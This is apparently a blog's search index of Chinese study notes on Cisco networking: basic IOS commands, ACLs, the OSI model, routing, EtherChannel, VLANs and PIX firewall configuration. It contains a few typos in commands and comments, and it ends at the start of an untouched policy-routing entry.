<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[CPT介绍及基本配置]]></title>
    <url>%2F2019%2F09%2F23%2FCPT%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[Cisco Packet Tracer介绍：Cisco Packet Tracer 是由Cisco公司发布的一个辅助学习工具，为学习思科网络课程的初学者去设计、配置、排除网络故障提供了网络模拟环境。用户可以在软件的图形用户界面上直接使用拖曳方法建立网络拓扑，并可提供数据包在网络中行进的详细处理过程，观察网络实时运行情况。 设备及线缆：其中含有路由器、交换机、线缆等网络设备。 双绞线：直通线、交叉线、全反线 直通线：T568B标准：白橙-橙-白绿-蓝-白蓝-绿-白棕-棕 ​ 两端线序：T568B-T568B 交叉线：T568A标准：白绿-绿-白橙-蓝-白蓝-橙-白棕-棕 ​ 两端线序：T568B-T568A 全反线：Console线，即串口线 ​ 两端线序：T568B（12345678-87654321） 设备之间连线规则：同交异直（同种设备交叉线、不同设备直通线） 注：路由器和PC属于同种设备！！！ 设备开机过程：加电自检→从flash查找和装载IOS→从NVROM里加载启动配置文件→是否进入配置向导→直接进入配置模式 特殊配置文件： startup-config（启动配置文件） running-config（运行配置文件） 基本命令操作：Router&gt; //用户模式Router# //特权模式（在用户模式输入enable）Router(config)# //全局模式（在特权模式输入conf t）Router(config)#hostname R1 //配置路由器名称R1(config)#interface FastEthernet 0/0 //进入接口R1(config-if)# //接口模式R1(config-if)#ip address 192.168.1.1 255.255.255.0 //配置IPR1(config-if)#no shutdown //开启端口R1(config-if)#exit //退出当前模式，返回上一级模式R1(config-if)#end //返回特权模式R1#reload //重启设备 要点： ​ ⚫命令支持简写，如enable可以简写为en ​ ⚫问号能够弹出帮助菜单 ​ ⚫tab键能够补全命令，如输入en，按tab键能补全为enable 设备密码配置：使能加密密码：R1(config)#enable password 123456 //明文密码R1(config)#enable secret 123456 //密文密码 当明文和密文同时配置时，加密的密码优先生效 保存配置文件：R1#copy running-config startup-configR1#write 两种方式均可 查看详细配置：R1#show ip interface brief //查看接口摘要信息R1#show running-config //查看当前的运行配置文件R1#show startup-config //查看启动配置文件 …… 设备管理：远程登录：Switch(config)#int vlan 1Switch(config-if)#ip add 1.1.1.1 255.255.255.0 //配置管理地址Switch(config-if)#no shut //启用接口Switch(config)#line vty 0 4 //进入VTY端口Switch(config-line)#password 123 //设置登录密码Switch(config-line)#login //允许登录 vty后的0 4表示同时允许5个终端连接，最多为0 15 控制台登录：Switch(config)#line console 0 //进入console端口Switch(config-line)#password 123 //设置登录密码Switch(config-line)#login //允许登录 备份与还原：Switch#copy tftp: flash: //通过tftp从服务器升级IOSSwitch#show flash //查看IOS版本Switch#copy flash: tftp: //通过tftp备份IOS到服务器Switch#copy runnning-config：tftp： //备份运行配置文件Switch#copy tftp：runnning-config： //还原运行配置文件]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>网络设计及扩展</tag>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ACL-访问控制列表]]></title>
    <url>%2F2019%2F09%2F23%2FACL%2F</url>
    <content type="text"><![CDATA[ACL（访问控制列表）：访问控制列表（ACL）是一种基于包过滤的访问控制技术，它可以根据设定的条件对接口上的数据包进行过滤，允许其通过或丢弃。访问控制列表被广泛地应用于路由器和三层交换机。借助于访问控制列表，可以有效地控制用户对网络的访问，从而最大程度地保障网络安全。 ACL的基本原理：它负责管理用户配置的所有的规则，提供报文匹配规则的算法。 ACL规则的匹配： 报文到达设备后，设备从报文中提取信息，并将提取到的报文与ACL规则进行匹配，如果有提取的信息与规则匹配成功就称作命中规则，之后就停止查找，根据匹配的规则进行相应的动作； 还有可能查找完所有的匹配规则都没有一条规则能匹配成功，这称为未命中规则。 匹配过程会有两种结果，命中规则和未命中规则，命中规则中又分为命中permit(允许)规则和命中deny(拒绝)规则。 ACL分类：标准ACL： 标准ACL只检查数据包的源地址，网络管理员可以使用标准ACL阻止来自某一网络的所有通信流量，或者允许来自某一特定网络的所有通信流量，或者拒绝某一协议簇（比如IP）的所有通信流量。 标准ACL的列表号是1~99 扩展ACL： 扩展ACL既检查数据包的源地址，也检查数据包的目的地址，同时还可以检查数据包的特定协议类型、端口号等。扩展ACL比标准ACL提供了更广泛的控制范围。例如，网络管理员如果希望做到“允许外来的Web通信流量通过，拒绝外来的FTP和Telnet等通信流量”，那么，他可以使用扩展ACL来达到目的，标准ACL不能控制这么精确。 扩展ACL的列表号是100~199 命名ACL： 命名访问控制列表允许在标准和扩展访问控制列表中使用名称代替表号。 ACL的配置：标准ACL的创建：R1(config)#access-list 1 permit 192.168.1.10 0.0.0.255 //允许网络192.168.1.10R1(config)#access-list 1 deny 192.168.1.10 0.0.0.255 //拒绝网络192.168.1.10R1(config)#access-list 1 permit any //允许其他所有R1(config)#no access-list 1 deny 192.168.1.10 0.0.0.255 //删除访问控制列表R1(config)#interface f0/1 //进入接口R1(config-if)#ip accss-group 1 in/out //应用到端口R1(config-if)#no ip accss-group 1 in/out //取消应用到端口R1(config-if)#show access-list //查看访问控制列表 通配符掩码：也叫做反码。用二进制数0和1表示，如果某位为1，表明这一位不需要进行匹配操作，如果为0表明需要严格匹配。 隐含拒绝语句： R1(config)#access-list 1 deny 0.0.0.0 255.255.255.255 扩展ACL的创建：R1(config)#access-list 101 permit ip 192.168.1.0 0.0.0.255 192.168.2.0 0.0.0.255 //允许网络192.168.1.10访问192.168.2.0的所有服务R1(config)#access-list 101 deny tcp 192.168.1.0 0.0.0.255 host 192.168.2.2 eq 21 //拒绝192.168.1.0网段访问192.168.2.2的TCP的21端口R1(config)#access-list 101 permit ip any any //允许其他所有R1(config)#access-list 101 deny icmp 192.168.1.0 0.0.0.255 host 192.168.2.2 echo //拒绝192.168.1.0网络ping主机192.168.2.2R1(config-if)#ip accss-group 101 in/out //应用到端口 命名ACL的创建：R1(config)#access-list standard list1 //创建名为list1的标准ACLR1(config)#access-list extended list2 //创建名为list2的扩展ACLR1(config-list)#permit host 192.168.1.1 //允许网络R1(config-list)#deny any //拒绝所有R1(config-if)#ip accss-group list1 in/out //应用到端口 基于时间的ACL：当有些时候需要在一定时间段让ACL生效时，可以使用基于时间的ACL来实现。 R1(config)#time-range time1 //创建一个名为time1的时间区间R1(config-range)#absolute start 0:00 1 oct 2019 end 0:00 8 oct 2019 //建立一个时间区间范围R1(config-range)#periodic daily 9:00 to 17:00 //建立一个周期时间范围R1(config-range)#periodic Thursday 9:00 to friday 17:00 //建立一个周期时间范围R1(config)# access-list 101 deny tcp any host 192.168.1.254 eq 20 time-range time1 //应用到ACL]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>网络设计及扩展</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络层次结构]]></title>
    <url>%2F2019%2F09%2F23%2F%E7%BD%91%E7%BB%9C%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%2F</url>
    <content type="text"><![CDATA[OSI七层模型：简介：OSI（Open System Interconnection）,即开放系统互连，它是一种网络的参考模型，主要分为七层。 基本层次：应用层：提供用户界面；文件、打印、消息、数据库和应用程序服务。它是用户与计算机交流的场所，仅当马上需要访问网络时，这一层才会发挥作用，是实际应用程序之间的接口，如FTP、TFTP等。 表示层：表示数据进行加密等处理；数据加密、压缩和转换服务。它向应用层提供数据，并负责数据转换和代码格式化，OSI制定了相关的协议标准，这些标准定义了如何格式化标准数据。诸如数据压缩、解压缩、加密和解密等任务都与表示层有关。有些表示层标准还涉及多媒体操作。 会话层：将不同应用程序的数据分离；对话控制。它负责在表示层实体之间建立、管理和终止会话，还对设备或节点之间的对话进行控制。它协调和组织系统之间的通信，为此提供了3种不同的模式：单工、半双工和全双工。总之，会话层的基本功能是将不同应用程序的数据分离。 传输层：提供可靠或者不可靠的传输，在重传前执行纠错；端到端连接。它将数据进行分段并重组为数据流。位于传输层的服务将来自上层应用的数据进行分段和重组，并将它们合并到同一个数据流中。他们提供了端到端的数据传输服务，并可在互联网络上的发送主机和目标主机之间建立逻辑连接。 网络层：提供逻辑地址，路由器使用它们来选择路径；路由选择。它管理设备编址、跟踪设备在网络中的位置并确定最佳的数据传输路径，网络层必须在位于不同网络中的设备之间传输数据流，路由器位于网络层，在互联网络中提供路由选择服务。 数据链路层：将分组拆分为字节，并将字节组合成帧，使用MAC地址提供介质访问，执行错误检测，但不会纠错；成帧。IEEE以太网数据链路层包含两个子层。 介质访问控制（MAC）子层（802.3）:它定义了如何通过介质传输分组。它采用”先到先服务”的访问方式，带宽由大家共享，因此称为竟用介质访问( contention media access )。 这个子层定义了物理地址和逻辑拓扑。什么是逻辑拓扑呢?它指的是信号在物理拓扑中的传输路径。在这个子层，还可使用线路控制、错误通知(不会纠错)、顺序传递帧以及可选的流量控制。 逻辑链路控制（LLC）子层（802.2）：负责识别网络层协议并对其进行封装。 LLC 报头告诉数据链路层收到帧后如何对分组进行处理。其工作原理类似于：收到帧后，主机查看 LLC报头以确定要将分组交给谁，如网络层的 IP 协议 LLC 还可提供流量控制以及控制比特排序。 物理层：在设备之间传输比特、指定电平、电缆速度和电缆针脚；物理拓扑，主要发送和接收比特数据。 数据的封装与解封装：封装与解封装过程：(1) 用户信息被转换为数据，以便通过网络进行传输。 (2) 数据被转换为数据段，发送主机和接收主机之间建立一条可靠的连接。 (3) 数据段被转换为分组或数据报，逻辑地址被添加在报头中，以便能够在互联网络中路由分组。 (4) 分组或数据报被转换为帧，以便在本地网络中传输。硬件(以太网)地址被用于唯一标识本地网段中的主机。 (5) 帧被转换为比特，并使用数字编码方法和时钟同步方案。 不同层次传输数据类型：传输层：数据以数据段的形式传输 网络层：数据以分组的形式传输 数据链路层：数据以帧的形式传输 物理层：数据以比特的形式传输 TCP/IP与DOD模型:DoD模型与OSI模型的对应关系: 不同层次的协议： 常用协议： TCP：传输控制协议（TCP，Transmission Control Protocol）是一种面向连接的、可靠的、基于字节流的传输层通信协议。 TCP三次握手： 第一次握手：建立连接时，客户端会发送SYN（同步序列编号）包（syn=j）到服务端，并进入SYN_SEND（发送）状态，等待服务端确认。 第二次握手：服务器收到SYN包，确认客户端的SYN（ACK=j+1），同时自己也发送一个SYN包（SYN=k），即SYN+ACK包，此时服务器进入SYN_RECV（接收）状态。 第三次握手：客户端收到服务器的SYN+ACK包，向服务器发送确认包ACK（ack=k+1），此包发送完毕，客户端和服务端进入ESTABLISHED（连接）状态，完成三次握手。 使用TCP的协议：FTP、Telnet、SMTP、HTTP、POP3 UDP：internet 协议集支持一个无连接的传输协议，该协议称为用户数据报协议（UDP，User Datagram Protocol）。UDP 为应用程序提供了一种无需建立连接就可以发送封装的 IP 数据报的方法，此连接方式并不可靠。 常用的UDP端口号：53（DNS）、69（TFTP）、161（SNMP） 使用UDP的协议：TFTP、SNMP、NFS、DNS、BOOTP]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>网络设计及扩展</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[路由重分布]]></title>
    <url>%2F2019%2F09%2F23%2F%E8%B7%AF%E7%94%B1%E9%87%8D%E5%88%86%E5%B8%83%2F</url>
    <content type="text"><![CDATA[路由重分布：路由重分布为在同一个互连网络中高效地支持多种路由协议提供了可能，执行路由重分布的路由器被称为边界路由器，因为它们位于两个或多个自治系统的边界上。 路由重分布时度量标准和管理距离是必须要考虑的，在进行行重分布时必须转换试题标准，使得它们兼容。种子度量值（Seed Metric)是在路由生分布时定义的，它是一条通过外部重分布进来的路由的初始度量值。路由协议默认的种子度量值如下表： 路由协议 默认种子度量值 RIP 无限大 EIGRP 无限大 OSPF 20，BGP为1 IS-IS 0 BGP IGP的度量值 考虑的问题： 1、路由反馈：双向重分布有可能把从一个自治系统学到的路由信息发送回该自治系统。 2、路由信息的兼容：不同路由协议的度量标准是不同的 3、收敛时间不一致 路径控制概述：为了保证网络的高效运行及在路由重分布的时候避免次优路由或者路由环路，有必要对路由更新进行控制，常用的方法有被动接口、默认路由、静态路由、路由映射表、分布列表、前缀列表、偏移列表、Cisco IOS IP服务等级协议（SLA）和策略路由。在进行路由控制时，可能是多种方法进行组合。 路由映射表（Router Map） 可以比做复杂的访问控制列表，主要功能包括路由控制和策略路由等。 1、定义路由映射表的格式如下： 定义路由映射表：route-map map-tag [permit |deny] [sequence-number] 条件匹配： macth（常用的匹配条件包括IP地址、接口、、度量值、tag、路由类型以及数据包长度等） 如果格式为：match ip address a b c 表示逻辑或，只要有一个条件满足即可 如果格式为：match ip address a match ip address b match ip address c 表示逻辑与，必须同时满足所有条件 定义行为：set Set行为 描述 set ip next hop 设定数据包的下一跳地址 set interface 设定数据包出接口 set ip default next hop 设置默认的下一跳地址，用于当路由表里没有达到目的地址路由条目的时候 set ip tos 设定IP数据包的TOS值 set ip precedence 设定IP数据包的优先级 set metric 设置路由的度量值 set tag 设定路由的标记值 2、路由映射表有如下特征 1、一个route map末尾默认行为是“deny any” ​ 如执行策略路由时，没有匹配则正常转发 ​ 如路由重分时，没有匹配则被过滤掉 2、一个route map可以包含多个route map陈述，从上到下被执行，如route map陈述中没有math，则匹配所有。 3、序列号指定了条件执行的顺序，不写默认为10，不会自动递增 4、route map中不写permit deny默认为permit 5、在删除route map时，没写编号则删除整个route map]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>网络设计及扩展</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[路由协议介绍及静态路由]]></title>
    <url>%2F2019%2F09%2F23%2F%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE%E4%BB%8B%E7%BB%8D%E5%8F%8A%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1%2F</url>
    <content type="text"><![CDATA[路由协议：路由（routing）是指分组从源到目的地时，决定端到端路径的网络范围的进程 。路由工作在OSI参考模型第三层——网络层的数据包转发设备。路由器通过转发数据包来实现网络互连。虽然路由器可以支持多种协议（如TCP/IP、IPX/SPX、AppleTalk等协议），但是在我国绝大多数路由器运行TCP/IP协议。路由器通常连接两个或多个由IP子网或点到点协议标识的逻辑端口，至少拥有1个物理端口。路由器根据收到数据包中的网络层地址以及路由器内部维护的路由表决定输出端口以及下一跳地址，并且重写链路层数据包头实现转发数据包。路由器通过动态维护路由表来反映当前的网络拓扑，并通过网络上其他路由器交换路由和链路信息来维护路由表。 为了实现路由功能，路由器应该做到：知道目的地址、分辨源从哪里学到、发现可能路由、选择最佳路由、不停地检测与维护路由信息。 路由表与路由条目：直连: 路由器连接到该网络 静态路由: 由系统管理员手动输入 动态路由:通过交换路由信息获得 默认路由: 静态或动态获得; 在不知道网络的明确路由时使用 自治系统：自治系统是通用管理域中的网络的集合，内部网关协议在自治系统中工作，外部网关协议连接不同的自治系统。 静态路由与动态路由：静态路由： 由网络管理员手动输入路由器命令管理，在小型网络中适合设置静态路由 配置方法： Router(config)#ip route 172.16.3.0 255.255.255.0 192.168.1.2 / f0/1 目标网络 目标网络掩码 下一跳地址或自身接口 动态路由： 动态路由协议根据拓扑或流量改变而自动调整，路由器之间使用路由协议确定到达远程网络的路径，并在路由表中维护这些网络。确定路径后，路由器可以将路由协议路由到已获知的网络。常见的动态路由协议有RIP、EIGRP、OSPF等 路由协议类型： 路由协议的类型有距离矢量路由协议、高级距离矢量路由协议和链路状态路由协议。]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>网络设计及扩展</tag>
        <tag>路由协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[链路聚合]]></title>
    <url>%2F2019%2F09%2F23%2F%E9%93%BE%E8%B7%AF%E8%81%9A%E5%90%88%2F</url>
    <content type="text"><![CDATA[以太网链路聚合：链路聚合又称为端口聚合，端口捆绑，英文名porttrunking。是一种聚合多个物理接口 ( that ) 创建一个逻辑接口。你可以捆扎( bundle ) 八个单独的活动链接到一个信道端口，以提供更高的带宽和冗余。端口通道也负载平衡这些物理接口上的通信量。只要端口通道中的至少一个物理接口可操作，端口通道就可以保持运行 channel-group模式与说明：PAgP 是 Cisco私有，只能在 Cisco Switch 上设定，PAgP 有两个模式，分別是 Desirable 与 Auto当 PAgP 成功建立 EtherChannel 后，PAgP Message 会继续定时传送去维持 EtherChannel ​ Desirable Auto Desirable √ √ 主动发送PAgP报文 Auto √ x 被动发送PAgP报文 On 手动设置，需要两边都设置 LACP 是 IEEE Standard ​ Active Passive Active √ √ 主动发送LACP报文 Passive √ x 主动接收LACP报文 （1）Cisco最多允许EtherChannel绑定8个端口；如果是百兆网络，总带宽可达1.6Gbit/s；如果是千兆网络，总带宽可达16Gbit/s。 （2）EtherChannel不支持10M端口； （3）EtherChannel编号只在本地有效，链路两端的编号可以不一样； （4）EtherChannel默认使用PAgP协议； （5）EtherChannel默认情况下是基于源MAC地址的负载平衡； （6）一个EtherChannel内所有的端口都必须具有相同的端口速率和双工模式，LACP只能是全双工模式； （7）channel-group接口会自动继承最小物理接口，或最先配置的接口模式； （8）cisco的交换机不仅可以支持第二层EtherChannel,还可以支持第三层EtherChannel。 配置端口聚合：Switch(config)#int port-channel 1 //启用编号为1的聚合端口Switch(config-if)#switchport mode trunk //设置端口模式为trunkSwitch(config)#int range f0/1-2 //进入物理端口Switch(config-if)#switchport mode trunk //设置端口模式为trunkSwitch(config-if-range)#channel-group 1 mode on //将物理端口加入聚合端口，模式为on 配置端口聚合的流量均衡：Switch(config)#int f0/1Switch(config-if)#spanning-tree vlan 10 port-priority 16Switch(config-if)#spanning-tree vlan 20 port-priority 32Switch(config)#int f0/2Switch(config-if)#spanning-tree vlan 10 port-priority 32Switch(config-if)#spanning-tree vlan 20 port-priority 16]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>网络设计及扩展</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[交换机工作原理及VLAN]]></title>
    <url>%2F2019%2F09%2F23%2F%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%8F%8AVLAN%2F</url>
    <content type="text"><![CDATA[数据链路层与交换机：数据链路层：数据链路层是位于网络层与物理层之间的层次，其中，以太网就是工作在数据链路层，在数据链路层中，数据是以帧的形式传输的。 以太网MAC地址：以太网地址用来识别一个以太网上的某个单独的设备或一组设备，又称物理地址。 MAC地址是由48位二进制数组成的，以十六进制数表示。前24位称为OUI（组织唯一标识符），后24位是厂商对网卡的唯一编号，第8位如果是0表示单播地址，是1表示组播地址。 交换机有一个基本MAC地址，每一个端口对应一个MAC地址。 以太网帧格式： 类型长度：0x0800为IPv4地址，0x86DD为IPv6地址 FCS：帧校验序列 MAC子层与LLC子层：介质访问控制（MAC）子层（802.3） ⚫将上层交下来的数据封装成帧迚行发送(接收时迚行相反的过程，将帧拆卸) ⚫实现和维护介质访访问控制协议，例如CSMA/CD ⚫比特差错检测 ⚫MAC帧的寻址，即MAC帧由哪个站（源站）收出，被哪个站／哪些站接收（目的站） 逻辑链路控制（LLC）子层（802.2） ⚫建立和释放数据链路层的逻辑连接 ⚫提供不上层的接口 ⚫给帧加上序号 以太网命名方法：N－信号－物理介质 N：以兆位为单位的数据速率，如10、100、1000 信号：基带还是宽带 物理介质：标识介质类型 举例：100BASE-TX 类型 接口 传输介质 标准 标准以太网 10Base-T 双绞线 IEEE 802.3 标准以太网 10Base5 粗同轴电缆 IEEE 802.3 标准以太网 10Base2 细同轴电缆 IEEE 802.3 快速以太网 100Base-TX 双绞线 IEEE 802.3u 快速以太网 100Base-FX 光纤 IEEE 802.3u 千兆以太网 1000Base-T 双绞线 IEEE 802.3ab、IEEE 802.3z 千兆以太网 1000Base-SX 多模光纤 IEEE 802.3ab、IEEE 802.3z 千兆以太网 1000Base-LX 单模光纤 IEEE 802.3ab、IEEE 802.3z 以太网交换机：交换机是用来连接局域网的主要设备 交换机能够根据以太网帧中目标地址智能的转发数据，因此交换机工作在数据链路层 交换机分割冲突域，实现全双工通信 交换机的数据转发原理：交换机的转发原理：转发 交换机根据MAC地址表单播转数据帧 学习 MAC地址表是交换机通过学习接收的数据帧的源MAC地址来形成的 广播 如果目标地址在MAC地址表中没有，交换机就向除接收到该数据帧的端口外的其他所有端口广播该数据帧 更新 交换机MAC地址表的老时间是300秒 交换机如果发现一个帧的入端口和MAC地址表中源MAC地址的所在端口不同，交换机将MAC地址重新学习到新的端口。 举例1：主机11给主机33发送一个数据帧 ​ 交换机A：在接收到数据帧后，执行以下操作： ​ 交换机A查找MAC地址表 ​ 交换机A学习主机11的MAC地址 ​ 交换机A向其他所有端口发送广播 ​ 主机22：查看数据包的目标MAC地址不是自己，丢弃数据包 ​ 交换机B：在接收到数据帧后，执行以下操作： ​ 交换机B查看MAC地址表 ​ 交换机B学习源MAC地址和端口号 ​ 交换机B向所有端口广播数据包 ​ 主机33：接收到数据帧 ​ 主机44：弃数据帧 在这个过程中，交换机的MAC地址表中没有需要的条目，交换机通过广播方式转发了数据帧 举例2：主机44给主机11发送一个数据帧 ​ 交换机B：在接收到数据帧后，执行以下操作： ​ 交换机B查看MAC地址表 ​ 交换机B学习源MAC地址和端口号 ​ 交换机B直接从端口1发送给交换A ​ 交换机A：在接收到数据帧后，执行以下操作： ​ 交换机A查找MAC地址表 ​ 交换机A学习源MAC地址和端口号 ​ 交换机A直接向11转发数据 ​ 主 机11：接收到数据帧 在这个过程中，交换机的MAC地址表中已经学到了需要的条目，交换机通过单播的方式，转发了数据帧 单工、半双工、全双工：单工：只有一个信道，传输方向只能是单向的 半双工：只有一个信道，在同一时刻，只能是单向传输 全双工：双信道，同时可以有双向数据传输 冲突、冲突域、广播域：集线器所有端口在一个冲突域，如果冲突过多，则传输效率就会降低、交换机分割冲突域，因为一个接口一个冲突域。 广播域指接收同样广播消息的节点的集合，如：在该集合中的任何一个节点传输一个广播帧，则所有其他能收到这个帧的节点都认为是广播帧的一部份。 交换机分割冲突域，但是不分割广播域，即交换机的所有端口属于同一个广播域。 交换机的基本配置：交换机访问方法：一般分为本地配置和远程配置两种方式，本地配置一般采用console端口连接，远程配置方式有telnet、ssh等连接方式。 端口安全：指对交换机的端口进行安全属性的配置，从而控制用户的安全接入。交换机端口安全主要有两种类型 一是限制交换机端口的最大连接数，从而控制交换机端口下连接的主机数，防止用户进行恶意的ARP（地址解析协议，即ARP【Address Resolution Protocol】）欺骗 二是针对交换机端口执行MAC地址、IP地址的绑定，从而实现对用户的严格控制。 对安全违例的处理方式有以下3种。 ​ ① protect 当安全地址个数满后，安全端口将丢弃未知名的地址包 ​ ② restrict 当违例产生时，将发送一个Trap通知 ​ ③ shutdown 当违例产生时，将关闭端口并发送一个Trap通知 trap，指被管理设备（代理）上报的陷阱报文，表明设备发生故障或变更的主动通知 交换机端口安全功能只能在Access接口进行配置！！ 配置实例： switch&gt;enableswitch#config terminalswitch(config)#int loopback 0 //创建环回接口switch(config-if)#ip address 1.1.1.1 255.255.255.0 //配置环回接口地址switch(config)#int fastethernet 0/1switch(config-if)#speed 100 //设置fastethernet0/1端口速率为10Mbit/sswitch(config-if)#duplex full //设置fastethernet0/1端口为全双工switch(config-if)#no shutdown //启用端口switch(config-if)#switchport mode access //设置当前端口为AccessSwitch(config-if)#switchport port-security //打开当前端口安全功能Switch(config-if)#switchport port-security maximum 1 //设置端口安全地址的最大个数Switch(config-if)#switchport port-security violation shutdown //配置处理违例的方式Switch(config-if)#switchport port-security mac-address 0001.C7E9.6EC0 //配置安全地址Switch(config-if)#switchport port-security violation shutdown //配置处理违例的方式 VLAN概述：VLAN（Virtual Local Area Network）的中文名为”虚拟局域网”，虚拟局域网（VLAN）是一组逻辑上的设备和用户，这些设备和用户并不受物理位置的限制，可以根据功能、部门及应用等因素将它们组织起来，相互之间的通信就好像它们在同一个网段中一样，由此得名虚拟局域网。 交换机的所有端口都在一个广播域，如果计算机数量增多会产生广播风暴。为了避免广播风暴，在交换机上可以采用虚拟局域网技术（Vlan） 配置实例： 划分Vlan:Switch#config Switch(config)#vlan 10修改vlan名称：Switch(config)#vlan 40Switch(config-vlan)#name rsb将端口加入到vlan:Switch(config)#int f0/1Switch(config-if)#switchport mode accessSwitch(config-if)#switchport access vlan 10查看vlan配置信息：Switch#sh vlan brief VLAN间通信：Trunk技术：（1）封装 ​ ISL（思科私有）：是在数据帧前加26字节，尾加4字节 ​ 802.1Q（工业标准）：是在数据帧中插入4字节，打标签 ​ 802.1Q Native Vlan：默认vlan1不打标，作管理用 （2）模式 Mode DTP send DTP Response Access - - Trunk Y Y Desirable(企望) Y Y Auto(自动) N Nonegotiate(不协商) N N （3）查看trunk信息 Switch(config-if)#switchport mode trunkSwitch#show interfaces trunkSwitch(config-if)# switchport trunk allowed vlan 10Switch(config-if)# switchport trunk native vlan1 //本征vlan （4）不同vlan间通信 使用三层交换机，起SVI接口，打开路由 单臂路由 ： ①使用三层交换机实现不同vlan间通信 ​ 第一步：trunk链路Switch(config-if)#switchport trunk encapsulation dot1q 第二步：划分vlanSwitch(config)#vlan 10Switch(config-vlan)#vlan 20第三步：开启SVI接口作为相应vlan客户端的网关Switch(config)#int vlan 10Switch(config-if)#ip add 192.168.10.254 255.255.255.0Switch(config-if)#no shutdown Switch(config)#int vlan 20Switch(config-if)#ip add 192.168.20.254 255.255.255.0Switch(config-if)#no shutdown第四步：开启三层交换机路由功能Switch(config)#ip routing //开启三层交换机路由功能 第五步：为客户机设置网关地址 SVI：svi是联系vlan的ip接口，一个svi只能和一个vlan相联系 VTP技术：VTP（VLAN Trunking Protocol）：是VLAN中继协议，也被称为虚拟局域网干道协议。它是思科私有协议。作用是十几台交换机在企业网中，配置VLAN工作量大，可以使用VTP协议，把一台交换机配置成VTP Server, 其余交换机配置成VTP Client,这样他们可以自动学习到server 上的VLAN 信息。 vtp有三种模式：分别是服务器模式（Server）、客户机模式（Client）、透明模式（Transparent） 基本命令： Switch(config)#hostname S1 //设置主机名Switch(config)#vtp domain s1.com //设置域名Switch(config)#vtp mode server/client/transparent //设置模式]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>网络设计及扩展</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[防火墙简单配置]]></title>
    <url>%2F2019%2F09%2F23%2F%E9%98%B2%E7%81%AB%E5%A2%99%E7%AE%80%E5%8D%95%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[防火墙配置实例：防火墙的三种模式：路由模式： 当防火墙位于内部网络和外部网络之间时，需要将防火墙与内部网络、外部网络以及DMZ 三个区域相连的接口分别配置成不同网段的IP 地址，重新规划原有的网络拓扑，此时相当于一台路由器。 采用路由模式时，可以完成ACL 包过滤、ASPF 动态过滤、NAT 转换等功能。然而，路由模式需要对网络拓扑进行修改（内部网络用户需要更改网关、路由器需要更改路由配置等），这是一件相当费事的工作，因此在使用该模式时需权衡利弊。 透明模式： 如果防火墙采用透明模式进行工作，则可以避免改变拓扑结构造成的麻烦，此时防火墙对于子网用户和路由器来说是完全透明的。也就是说，用户完全感觉不到防火墙的存在。 采用透明模式时，只需在网络中像放置网桥（bridge）一样插入该防火墙设备即可，无需修改任何已有的配置。与路由模式相同，IP 报文同样经过相关的过滤检查（但是IP 报文中的源或目的地址不会改变），内部网络用户依旧受到防火墙的保护。 混合模式： 如果防火墙既存在工作在路由模式的接口（接口具有IP 地址），又存在工作在透明模式的接口（接口无IP 地址），则防火墙工作在混合模式下。混合模式主要用于透明模式作双机备份的情况，此时启动VRRP（Virtual Router Redundancy Protocol，虚拟路由冗余协议）功能的接口需要配置IP 地址，其它接口不配置IP地址。 配置实例：透明模式配置实例： 实验拓扑： 防火墙配置（透明模式）： pixfirewall(config)# firewall transparentpixfirewall(config)# ip add 10.0.0.3 255.255.255.248pixfirewall(config)# int e 0pixfirewall(config-if)# nameif insidepixfirewall(config-if)# security-level 100pixfirewall(config-if)# no shutdownpixfirewall(config)# int e 1pixfirewall(config-if)# nameif outsidepixfirewall(config-if)# security-level 0pixfirewall(config)# no shutdownpixfirewall(config)# access-list 110 permit icmp any anypixfirewall(config)# access-group 110 in interface insidepixfirewall(config)# access-group 110 in interface outside 路由模式配置实例： 实验拓扑： 防火墙配置（路由模式）： pixfirewall(config)# int e 0pixfirewall(config-if)# nameif insidepixfirewall(config-if)# security-level 100pixfirewall(config-if)# ip add 10.0.0.2 255.255.255.252pixfirewall(config-if)# no shutdownpixfirewall(config)# int e 1pixfirewall(config-if)# nameif outsidepixfirewall(config-if)# security-level 0pixfirewall(config-if)# ip add 61.1.1.1 255.255.255.0pixfirewall(config-if)# no shutdownpixfirewall(config)# route inside 192.168.1.0 255.255.255.0 10.0.0.2pixfirewall(config)# route outside 0.0.0.0 0.0.0.0 61.1.1.2pixfirewall(config)# access-list 1 permit icmp any anypixfirewall(config)# access-group 1 in interface outsidepixfirewall(config)# nat (inside) 1 192.168.1.0 255.255.255.0pixfirewall(config)# global (outside) 1 interface]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>防火墙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[策略路由]]></title>
    <url>%2F2019%2F09%2F23%2F%E7%AD%96%E7%95%A5%E8%B7%AF%E7%94%B1%2F</url>
